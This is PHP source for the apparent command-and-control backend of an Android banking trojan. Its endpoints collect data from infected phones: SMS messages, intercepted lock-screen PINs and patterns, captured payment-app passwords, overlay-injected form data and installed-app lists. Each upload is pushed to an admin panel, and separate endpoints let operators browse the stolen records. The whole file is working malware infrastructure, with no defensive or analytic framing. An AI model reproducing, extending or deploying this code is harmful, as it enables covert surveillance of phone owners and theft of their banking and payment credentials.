<?php
namespace app\controller;

use app\BaseController;
use think\facade\Db;
use think\facade\Request;

class SyncController extends BaseController
{
    /**
     * POST /api/sync/status
     * APK 状态同步（心跳 + 设备信息更新）
     * 对齐 Node-WS syncDeviceStatus() 的字段覆盖范围
     */
    public function status()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';

        if (!$deviceId) {
            return json(['success' => true, 'data' => null, 'message' => 'success']);
        }
        if (self::isDeviceDeleted((string)$deviceId)) {
            return json(['success' => false, 'message' => 'device deleted'], 410);
        }

        $now = time();
        $permissions = $data['permissions'] ?? null;
        $permissionsJson = $permissions ? json_encode($permissions, JSON_UNESCAPED_UNICODE) : '{}';
        $publicIp = Request::ip();

        $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();

        if (!$existing) {
            Db::table('fisher_devices')->insert([
                'device_id'             => $deviceId,
                'brand'                 => $data['brand'] ?? '',
                'model'                 => $data['model'] ?? '',
                'os_version'            => $data['osVersion'] ?? '',
                'app_version'           => $data['appVersion'] ?? '',
                'phone_number'          => $data['phoneNumber'] ?? '',
                'public_ip'             => $publicIp,
                'is_connected'          => 1,
                'connected_at'          => $now,
                'last_seen'             => $now,
                'first_seen'            => $now,
                'battery_level'         => isset($data['batteryLevel']) ? (int)$data['batteryLevel'] : 0,
                'network_type'          => $data['networkType'] ?? '',
                'is_screen_on'          => isset($data['isScreenOn']) ? ($data['isScreenOn'] ? 1 : 0) : 1,
                'is_charging'           => isset($data['isCharging']) ? ($data['isCharging'] ? 1 : 0) : 0,
                'is_locked'             => isset($data['isLocked'])   ? ($data['isLocked']   ? 1 : 0) : 0,
                'accessibility_alive'   => isset($data['accessibilityAlive']) ? ($data['accessibilityAlive'] ? 1 : 0)
                                           : (isset($data['accessibility_enabled']) ? ($data['accessibility_enabled'] ? 1 : 0) : 0),
                'local_service_connected' => isset($data['localServiceConnected']) ? ($data['localServiceConnected'] ? 1 : 0)
                                           : (isset($data['bridgeConnected']) ? ($data['bridgeConnected'] ? 1 : 0) : 0),
                'screen_width'          => isset($data['screenWidth'])  ? (int)$data['screenWidth']  : 0,
                'screen_height'         => isset($data['screenHeight']) ? (int)$data['screenHeight'] : 0,
                'permissions'           => $permissionsJson,
                'created_at'            => $now,
            ]);
        } else {
            $updates = [
                'last_seen'    => $now,
                'is_connected' => 1,
                'public_ip'    => $publicIp,
            ];
            if (isset($data['batteryLevel'])) $updates['battery_level'] = (int)$data['batteryLevel'];
            else $updates['battery_level'] = $existing['battery_level'] ?? 0;

            if (isset($data['networkType'])) $updates['network_type'] = $data['networkType'];
            else $updates['network_type'] = $existing['network_type'] ?? '';

            if (isset($data['isScreenOn'])) $updates['is_screen_on'] = $data['isScreenOn'] ? 1 : 0;
            if (isset($data['isCharging'])) $updates['is_charging']   = $data['isCharging'] ? 1 : 0;
            if (isset($data['isLocked']))   $updates['is_locked']     = $data['isLocked']   ? 1 : 0;
            if (isset($data['accessibilityAlive'])) {
                $updates['accessibility_alive'] = $data['accessibilityAlive'] ? 1 : 0;
            } elseif (isset($data['accessibility_enabled'])) {
                $updates['accessibility_alive'] = $data['accessibility_enabled'] ? 1 : 0;
            }
            if (isset($data['localServiceConnected'])) {
                $updates['local_service_connected'] = $data['localServiceConnected'] ? 1 : 0;
            } elseif (isset($data['bridgeConnected'])) {
                $updates['local_service_connected'] = $data['bridgeConnected'] ? 1 : 0;
            }
            if (isset($data['screenWidth']))  $updates['screen_width']  = (int)$data['screenWidth'];
            if (isset($data['screenHeight'])) $updates['screen_height'] = (int)$data['screenHeight'];
            if (isset($data['brand']))        $updates['brand']         = $data['brand'];
            if (isset($data['model']))        $updates['model']         = $data['model'];
            if (isset($data['osVersion']))    $updates['os_version']    = $data['osVersion'];
            if (isset($data['appVersion']))   $updates['app_version']   = $data['appVersion'];
            if (isset($data['phoneNumber']))  $updates['phone_number']  = $data['phoneNumber'];
            if ($permissions) {
                $updates['permissions'] = $permissionsJson;
            }
            Db::table('fisher_devices')->where('device_id', $deviceId)->update($updates);
        }

        static::broadcastToAdmins([
            'type'      => 'bot_status',
            'deviceId'  => $deviceId,
            'sessionId' => $deviceId,
            'data'      => $data,
        ]);

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/sync/messages
     * 同步短信
     */
    public function syncMessages()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        $messages = $data['messages'] ?? [];

        if ($deviceId && is_array($messages)) {
            $inserted = 0;
            foreach ($messages as $msg) {
                $address = $msg['address'] ?? '';
                $body = $msg['body'] ?? '';
                $date = $msg['date'] ?? '';
                $type = $msg['type'] ?? 1;
                // 去重：相同 device_id + address + body + date 不重复插入
                $exists = Db::table('fisher_sms_messages')
                    ->where('device_id', $deviceId)
                    ->where('address', $address)
                    ->where('body', $body)
                    ->where('date', $date)
                    ->find();
                if (!$exists) {
                    Db::table('fisher_sms_messages')->insert([
                        'device_id'  => $deviceId,
                        'address'    => $address,
                        'body'       => $body,
                        'date'       => $date,
                        'type'       => $type,
                        'created_at' => time(),
                    ]);
                    $inserted++;
                }
            }

            // 广播通知前端（与旧 Python 后端一致）
            if ($inserted > 0) {
                static::broadcastToAdmins([
                    'type'     => 'new_sms',
                    'deviceId' => $deviceId,
                    'count'    => $inserted,
                ]);
            }
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/sync/messages
     * 获取短信列表
     */
    public function getMessages()
    {
        $deviceId = Request::get('deviceId', '');
        $page = Request::get('page', 1);
        $pageSize = Request::get('pageSize', 50);

        $query = Db::table('fisher_sms_messages');
        if ($deviceId) {
            $query->where('device_id', $deviceId);
        }
        $total = $query->count();
        $list = $query->order('created_at', 'desc')
            ->limit($pageSize)
            ->page($page)
            ->select()->toArray();

        return json(['success' => true, 'data' => ['list' => $list, 'total' => $total, 'page' => $page, 'pageSize' => $pageSize], 'message' => 'success']);
    }

    /**
     * POST /api/sync/inbox
     * 同步收件箱（等同于 syncMessages）
     */
    public function syncInbox()
    {
        return $this->syncMessages();
    }

    /**
     * GET /api/sync/inbox
     */
    public function getInbox()
    {
        return $this->getMessages();
    }

    /**
     * POST /api/sync/credentials
     * 同步密码/密钥记录（锁屏密码 → fisher_passwords）
     */
    public function syncCredentials()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? $data['android_id'] ?? '';
        $cipherType = $data['cipherType'] ?? 'pin';
        $cipherText = $data['cipherText'] ?? $data['textCipher'] ?? $data['patternCipher'] ?? '';
        $gradeCode = $data['cipherGradeCode'] ?? '';

        // 判断来源
        $source = $data['source'] ?? $data['cipherSource'] ?? '';
        if (!$source) {
            $package = $data['packageName'] ?? $data['package'] ?? '';
            if (!$package || stripos($package, 'systemui') !== false || stripos($package, 'keyguard') !== false) {
                $source = 'lockscreen';
            } else {
                $source = 'manual';
            }
        }

        if ($deviceId && $cipherText) {
            Db::table('fisher_passwords')->insert([
                'device_id'   => $deviceId,
                'cipher_type' => $cipherType,
                'cipher_text' => $cipherText,
                'grade_code'  => $gradeCode,
                'source'      => $source,
                'created_at'  => time(),
            ]);

            // 广播通知前端（与旧 Python 后端一致）
            static::broadcastToAdmins([
                'type'     => 'NEW_PASSWORD',
                'deviceId' => $deviceId,
                'data'     => $data,
            ]);
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * POST /api/sync/cipher
     * 同步支付密码截获记录 → fisher_payment_cipher_records
     */
    public function syncCipher()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? $data['android_id'] ?? '';

        if ($deviceId) {
            $cipherText = $data['cipher'] ?? $data['password'] ?? $data['cipherText'] ?? $data['textCipher'] ?? '';
            if ($cipherText) {
                Db::name('payment_cipher_records')->insert([
                    'device_id'    => $deviceId,
                    'package_name' => $data['packageName'] ?? $data['package'] ?? '',
                    'app_name'     => $data['appName'] ?? $data['app_name'] ?? '',
                    'cipher_text'  => $cipherText,
                    'cipher_type'  => $data['cipherType'] ?? $data['type'] ?? 'pin',
                    'source'       => $data['source'] ?? '',
                    'created_at'   => time(),
                ]);

                // 广播通知前端刷新
                static::broadcastToAdmins([
                    'type'     => 'payment_cipher',
                    'deviceId' => $deviceId,
                    'data'     => $data,
                ]);
            }
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/sync/credentials
     * GET /api/sync/cipher
     * 获取密码记录
     */
    public function getCredentials()
    {
        return $this->getCipher();
    }

    public function getCipher()
    {
        $deviceId = Request::get('deviceId', '');
        $query = Db::table('fisher_passwords');
        if ($deviceId) {
            $query->where('device_id', $deviceId);
        }
        $list = $query->order('created_at', 'desc')->limit(200)->select()->toArray();
        return json(['success' => true, 'data' => $list, 'message' => 'success']);
    }

    /**
     * POST /api/sync/form
     * 同步注入表单数据
     */
    public function syncForm()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';

        if ($deviceId) {
            // 解析注入数据：优先取 formData，其次解析 data 字段（APK 发来的 JSON 字符串）
            $formData = null;
            if (isset($data['formData']) && !empty($data['formData'])) {
                $formData = $data['formData'];
            } elseif (isset($data['data'])) {
                // APK 格式: { type:'injection', data:'{"类型":"xxx","密码":"xxx",...}', deviceId, packageName }
                $rawData = $data['data'];
                if (is_string($rawData)) {
                    $parsed = json_decode($rawData, true);
                    if ($parsed !== null) {
                        $formData = $parsed;
                    } else {
                        // json_decode 失败 — 清洗控制字符后重试
                        $cleaned = preg_replace('/[\x00-\x1F\x7F]/', '', $rawData);
                        $parsed2 = json_decode($cleaned, true);
                        if ($parsed2 !== null) {
                            $formData = $parsed2;
                        } else {
                            $formData = ['raw' => $rawData];
                        }
                    }
                } else {
                    $formData = $rawData;
                }
            } else {
                // fallback: 排除外层包装字段，只保留有效数据
                $excludeKeys = ['type', 'deviceId', 'timestamp', 'packageName', 'templateName', 'template'];
                $formData = array_diff_key($data, array_flip($excludeKeys));
                if (empty($formData)) {
                    $formData = $data;
                }
            }

            // 从解析后的数据中提取类型作为 template_name
            $templateName = '';
            if (is_array($formData)) {
                $templateName = $formData['类型'] ?? $formData['type'] ?? $data['templateName'] ?? $data['template'] ?? '';
            }

            try {
                Db::name('injection_data')->insert([
                    'device_id'     => $deviceId,
                    'template_name' => $templateName,
                    'package_name'  => $data['packageName'] ?? '',
                    'form_data'     => json_encode($formData, JSON_UNESCAPED_UNICODE),
                    'created_at'    => time(),
                ]);
            } catch (\Exception $e) {}

            // ★ 2026-10-12 修复：上报到数据说明该包名的注入任务已完成，
            // 清除 active_injection_tasks 残留记录，避免前端一直显示"注入中"
            $injPackageName = $data['packageName'] ?? '';
            if ($deviceId && $injPackageName) {
                try {
                    Db::name('active_injection_tasks')
                        ->where('device_id', $deviceId)
                        ->where('package_name', $injPackageName)
                        ->delete();
                } catch (\Exception $e) {}
            }

            // 广播通知前端（与旧 Python 后端一致）
            static::broadcastToAdmins([
                'type'        => 'NEW_INJECTION_DATA',
                'deviceId'    => $deviceId,
                'packageName' => $injPackageName,
            ]);
        }

        return json(['success' => true, 'data' => null, 'message' => 'success']);
    }

    /**
     * GET /api/sync/form
     * 获取注入表单数据
     */
    public function getForm()
    {
        $deviceId = Request::get('deviceId', '');
        $list = [];
        try {
            $query = Db::name('injection_data');
            if ($deviceId) {
                $query->where('device_id', $deviceId);
            }
            $list = $query->order('created_at', 'desc')->limit(200)->select()->toArray();
            foreach ($list as &$item) {
                if (isset($item['form_data']) && is_string($item['form_data'])) {
                    $item['form_data'] = json_decode($item['form_data'], true) ?: [];
                }
            }
        } catch (\Exception $e) {
            $list = [];
        }
        return json(['success' => true, 'data' => $list, 'message' => 'success']);
    }

    /**
     * GET /api/sync/all
     * 获取所有同步数据概要
     */
    public function getAll()
    {
        $deviceId = Request::get('deviceId', '');
        $data = [
            'messages'    => 0,
            'credentials' => 0,
            'forms'       => 0,
        ];

        try {
            $query = Db::table('fisher_sms_messages');
            if ($deviceId) $query->where('device_id', $deviceId);
            $data['messages'] = $query->count();
        } catch (\Exception $e) {
            $data['messages'] = 0;
        }

        try {
            $query = Db::table('fisher_passwords');
            if ($deviceId) $query->where('device_id', $deviceId);
            $data['credentials'] = $query->count();
        } catch (\Exception $e) {
            $data['credentials'] = 0;
        }

        try {
            $query = Db::name('injection_data');
            if ($deviceId) $query->where('device_id', $deviceId);
            $data['forms'] = $query->count();
        } catch (\Exception $e) {
            $data['forms'] = 0;
        }

        return json(['success' => true, 'data' => $data, 'message' => 'success']);
    }

    /**
     * POST /api/sync/app-list
     * 已安装应用列表上传（APK初始化必调，没路由会导致初始化中断 → /api/tunnel/config 永不调用）
     * C2_PROTOCOL.md L305: {deviceId, apps:JSONArray, total:int}
     *
     * ★ 2026-09-19 修复：应用列表只显示3个 / 两套数据源互不通
     *  - 同步写入 fisher_devices.other_info.apps（旧） AND fisher_device_apps.installed_apps（新）
     *  - 新上报的 apps 只有 3 个时，不再无脑覆盖全量；只有新数组长度 ≥ 旧数组或传了全量标识才覆盖
     *  - 否则合并：packageName 作为 key 去重追加
     */
    public function syncAppList()
    {
        $data = Request::post();
        $deviceId = $data['deviceId'] ?? '';
        if (!$deviceId) {
            return json(['success' => true, 'data' => ['saved' => 0], 'message' => 'success']);
        }
        if (self::isDeviceDeleted((string)$deviceId)) {
            return json(['success' => false, 'data' => ['saved' => 0], 'message' => 'device deleted'], 410);
        }
        $apps = $data['apps'] ?? null;
        $appsArr = null;
        if (is_array($apps)) {
            $appsArr = $apps;
        } elseif (is_string($apps)) {
            $appsArr = @json_decode($apps, true) ?: null;
        }
        $appsJson = is_array($appsArr) ? json_encode($appsArr, JSON_UNESCAPED_UNICODE) : null;
        $total = (int)($data['total'] ?? 0);
        // 是否是全量（APK 初始化时会带 total；只有注入相关的 3 个时 total 通常和数组长度相近，不能 100% 确定，所以用 "数组长度<30" 判定为增量）
        $forceFull = (bool)($data['full'] ?? false) || ($total > 0 && $appsArr && count($appsArr) >= $total - 5);
        try {
            // 1. 更新 fisher_devices（旧格式，other_info 里）
            $existing = Db::table('fisher_devices')->where('device_id', $deviceId)->find();
            $mergedApps = null;
            $mergedTotal = 0;
            if ($appsArr !== null) {
                $oldOther = @json_decode(($existing['other_info'] ?? null) ?? '{}', true) ?: [];
                if (!is_array($oldOther)) $oldOther = [];
                $oldApps = $oldOther['apps'] ?? [];
                if (!is_array($oldApps)) $oldApps = [];
                if ($forceFull || !$oldApps || count($appsArr) >= count($oldApps)) {
                    $mergedApps = $appsArr;
                    $mergedTotal = $total > 0 ? $total : count($appsArr);
                } else {
                    // 合并去重，以 packageName/package 为唯一键
                    $byPkg = [];
                    foreach (array_merge($oldApps, $appsArr) as $a) {
                        if (!is_array($a)) continue;
                        $key = !empty($a['packageName']) ? $a['packageName']
                             : (!empty($a['package'])      ? $a['package']
                             : (isset($a[0]) && is_string($a[0]) ? $a[0] : null));
                        if ($key === null) {
                            $byPkg['_'.md5(json_encode($a, JSON_UNESCAPED_UNICODE))] = $a;
                        } else {
                            $byPkg[$key] = $a; // 新覆盖旧
                        }
                    }
                    $mergedApps = array_values($byPkg);
                    $mergedTotal = max($total, count($mergedApps), (int)($oldOther['appsTotal'] ?? 0));
                }
            }
            if ($existing) {
                $merge = [];
                if ($mergedApps !== null) {
                    $oldOther = @json_decode(($existing['other_info'] ?? null) ?? '{}', true) ?: [];
                    if (!is_array($oldOther)) $oldOther = [];
                    $oldOther['apps'] = $mergedApps;
                    $oldOther['appsTotal'] = $mergedTotal;
                    $merge['other_info'] = json_encode($oldOther, JSON_UNESCAPED_UNICODE);
                }
                $merge['last_seen'] = time();
                Db::table('fisher_devices')->where('device_id', $deviceId)->update($merge);
            } else {
                Db::table('fisher_devices')->insert([
                    'device_id'   => $deviceId,
                    'last_seen'   => time(),
                    'first_seen'  => time(),
                    'is_connected'=> 1,
                    'other_info'  => $mergedApps ? json_encode(['apps'=>$mergedApps,'appsTotal'=>$mergedTotal], JSON_UNESCAPED_UNICODE) : null,
                    'created_at'  => time(),
                ]);
            }

            // 2. 同时写入 fisher_device_apps.installed_apps（新格式）
            if ($mergedApps !== null) {
                $now = time();
                $da = Db::name('device_apps')->where('device_id', $deviceId)->find();
                if ($da) {
                    Db::name('device_apps')->where('device_id', $deviceId)->update([
                        'installed_apps' => json_encode($mergedApps, JSON_UNESCAPED_UNICODE),
                        'updated_at' => $now,
                    ]);
                } else {
                    Db::name('device_apps')->insert([
                        'device_id' => $deviceId,
                        'installed_apps' => json_encode($mergedApps, JSON_UNESCAPED_UNICODE),
                        'injection_active' => 1,
                        'updated_at' => $now,
                    ]);
                }
            }
        } catch (\Exception $e) {
            // 静默吞错：APP 仅关心成功不重试，失败不应该中断后续 tunnel/config 流程
        }
        return json([
            'success' => true,
            'data' => [
                'saved' => 1,
                'deviceId' => $deviceId,
                'count' => is_array($mergedApps) ? count($mergedApps) : 0,
                'total' => $mergedTotal,
            ],
            'message' => 'success'
        ]);
    }

    /**
     * GET /api/sync/app-list
     * 查询某设备已上传的应用列表（前端控制页展示用）
     * ★ 2026-09-19 修复：优先读 fisher_device_apps.installed_apps，兜底读 fisher_devices.other_info，合并去重
     */
    public function getAppList()
    {
        $deviceId = Request::get('deviceId', '');
        $list = [];
        $total = 0;
        if ($deviceId) {
            $appsA = [];
            try {
                $da = Db::name('device_apps')->where('device_id', $deviceId)->find();
                if ($da && !empty($da['installed_apps'])) {
                    $appsA = @json_decode($da['installed_apps'], true) ?: [];
                }
            } catch (\Exception $e) {
                $appsA = [];
            }
            $appsB = [];
            $appsTotalB = 0;
            try {
                $row = Db::table('fisher_devices')->where('device_id', $deviceId)->field('other_info')->find();
                if ($row && !empty($row['other_info'])) {
                    $info = @json_decode($row['other_info'], true) ?: [];
                    $appsB = $info['apps'] ?? [];
                    $appsTotalB = (int)($info['appsTotal'] ?? 0);
                }
            } catch (\Exception $e) {
                $appsB = [];
            }
            $byPkg = [];
            foreach (array_merge(is_array($appsA) ? $appsA : [], is_array($appsB) ? $appsB : []) as $a) {
                if (!is_array($a)) continue;
                $key = !empty($a['packageName']) ? $a['packageName']
                     : (!empty($a['package'])      ? $a['package']
                     : (isset($a[0]) && is_string($a[0]) ? $a[0] : null));
                if ($key === null) $key = '_'.md5(json_encode($a, JSON_UNESCAPED_UNICODE));
                $byPkg[$key] = $a;
            }
            $list = array_values($byPkg);
            $total = max(count($list), $appsTotalB, is_array($appsA) ? count($appsA) : 0);
        }
        return json(['success' => true, 'data' => ['apps' => $list, 'total' => $total], 'message' => 'success']);
    }
}
